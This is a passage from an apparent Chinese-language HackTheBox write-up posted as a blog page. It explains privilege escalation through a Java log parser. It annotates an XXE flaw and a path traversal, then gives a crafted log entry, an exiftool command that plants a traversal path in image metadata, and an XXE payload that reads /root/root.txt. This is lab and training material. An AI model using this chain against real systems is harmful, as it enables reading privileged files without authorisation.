+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">addViewTo</span><span class="o">(</span><span class="n">String</span> <span class="n">path</span><span class="o">,</span> <span class="n">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JDOMException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">SAXBuilder</span> <span class="n">saxBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXBuilder</span><span class="o">();</span><span class="c1">//SAXBuilder如果使用默认配置就会触发XXE漏洞
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">XMLOutputter</span> <span class="n">xmlOutput</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XMLOutputter</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">xmlOutput</span><span class="o">.</span><span class="na">setFormat</span><span class="o">(</span><span class="n">Format</span><span class="o">.</span><span class="na">getPrettyFormat</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">File</span> <span class="n">fd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">saxBuilder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">fd</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Element</span> <span class="n">rootElement</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="na">getRootElement</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Iterator</span> <span class="n">var7</span> <span class="o">=</span> <span class="n">rootElement</span><span class="o">.</span><span class="na">getChildren</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="o">(</span><span class="n">var7</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Element</span> <span class="n">el</span> <span class="o">=</span> <span class="o">(</span><span class="n">Element</span><span class="o">)</span><span class="n">var7</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">==</span> <span class="s">&#34;image&#34;</span> <span class="o">&amp;&amp;</span> <span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">).</span><span class="na">getText</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">uri</span><span class="o">))</span> <span class="o">{</span><span class="c1">//存在image项且uri与传入的uri相同
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Integer</span> <span class="n">totalviews</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;totalviews&#34;</span><span class="o">).</span><span class="na">getText</span><span class="o">())</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Total views:&#34;</span> <span class="o">+</span> <span class="n">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;totalviews&#34;</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Integer</span> <span class="n">views</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;views&#34;</span><span class="o">).</span><span class="na">getText</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">                <span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">&#34;views&#34;</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">views</span> <span class="o">+</span> <span class="mi">1</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedWriter</span><span class="o">(</span><span class="k">new</span> <span class="n">FileWriter</span><span class="o">(</span><span class="n">fd</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">xmlOutput</span><span class="o">.</span><span class="na">output</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="n">writer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JDOMException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">JpegProcessingException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">File</span> <span class="n">log_fd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;/opt/panda_search/redpanda.log&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Scanner</span> <span class="n">log_reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">log_fd</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="o">(</span><span class="n">log_reader</span><span class="o">.</span><span class="na">hasNextLine</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">log_reader</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">isImage</span><span class="o">(</span><span class="n">line</span><span class="o">))</span> <span class="o">{</span><span class="c1">//isImage(line) 这一行中包含 .jpg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Map</span> <span class="n">parsed_data</span> <span class="o">=</span> <span class="n">parseLog</span><span class="o">(</span><span class="n">line</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">artist</span> <span class="o">=</span> <span class="n">getArtist</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span><span class="c1">//artist可控
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Artist: &#34;</span> <span class="o">+</span> <span class="n">artist</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">xmlPath</span> <span class="o">=</span> <span class="s">&#34;/credits/&#34;</span> <span class="o">+</span> <span class="n">artist</span> <span class="o">+</span> <span class="s">&#34;_creds.xml&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">addViewTo</span><span class="o">(</span><span class="n">xmlPath</span><span class="o">,</span> <span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span><span class="c1">//xmlPath-&gt;任意目录的xml文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>/opt/panda_search/redpanda.log</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">分割符号为</span><span class="o">||</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span><span class="o">=</span><span class="s">&#34;asdlkfj||qwer&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">a</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&#34;\\|\\|&#34;</span><span class="o">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="n">asdlkfj</span><span class="o">,</span> <span class="n">qwer</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;status_code&#34;</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">strings</span><span class="o">[</span><span class="mi">0</span><span class="o">]));</span>
+</span></span><span class="line"><span class="cl"><span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;ip&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl"><span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;user_agent&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">2</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl"><span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">3</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="err">日志内容为</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">200</span><span class="o">||</span><span class="mf">1.1.1.1</span><span class="o">||</span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="o">(</span><span class="n">X11</span><span class="o">;</span> <span class="n">Linux</span> <span class="n">x86_64</span><span class="o">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="o">(</span><span class="n">KHTML</span><span class="o">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="o">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">104.0.0.0</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span><span class="o">||/../../../../../../../../../../</span><span class="n">tmp</span><span class="o">/</span><span class="n">xxx</span><span class="o">.</span><span class="na">jpg</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>uri</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/../../../../../../../../../../tmp/xxx.jpg
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">exiftool -Artist=&#34;../../../tmp/xxx&#34; xxx.jpg
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">把xxx.jpg上传到服务器的/tmp目录
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/7b8be19e30b6aff68f71448e6b68fd82.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/7b8be19e30b6aff68f71448e6b68fd82.png, https://img.mi3aka.eu.org/2022/08/7b8be19e30b6aff68f71448e6b68fd82.png 1.5x, https://img.mi3aka.eu.org/2022/08/7b8be19e30b6aff68f71448e6b68fd82.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/7b8be19e30b6aff68f71448e6b68fd82.png"
+        title="https://img.mi3aka.eu.org/2022/08/7b8be19e30b6aff68f71448e6b68fd82.png" /></p>
+<ol start="3">
+<li>xmlPath</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">得到的artist为../../../tmp/xxx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">生成的xmlPath为/credits/../../../tmp/xxx_creds.xml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>xml内容</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version = &#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE ANY [
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY flag SYSTEM &#34;file:///root/root.txt&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;credits&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;image&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uri&gt;</span>/../../../../../../../../../../tmp/xxx.jpg<span class="nt">&lt;/uri&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;views&gt;</span>1<span class="nt">&lt;/views&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;x&gt;</span><span class="ni">&amp;flag;</span><span class="nt">&lt;/x&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/image&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;totalviews&gt;</span>1<span class="nt">&lt;/totalviews&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/credits&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar</code>完成后<code>/tmp/xxx_creds.xml</code>中的内容将被修改为<code>/root/root.txt</code>中的内容</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/94a6ee60ce0a576659daf235db011df7.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/94a6ee60ce0a576659daf235db011df7.png, https://img.mi3aka.eu.org/2022/08/94a6ee60ce0a576659daf235db011df7.png 1.5x, https://img.mi3aka.eu.org/2022/08/94a6ee60ce0a576659daf235db011df7.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/94a6ee60ce0a576659daf235db011df7.png"
+        title="https://img.mi3aka.eu.org/2022/08/94a6ee60ce0a576659daf235db011df7.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-08-29</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/htb-support/" class="prev" rel="prev" title="HackTheBox-Support"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox-Support</a>
+            <a href="/htb-trick/" class="next" rel="next" title="HackTheBox-Trick">HackTheBox-Trick<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
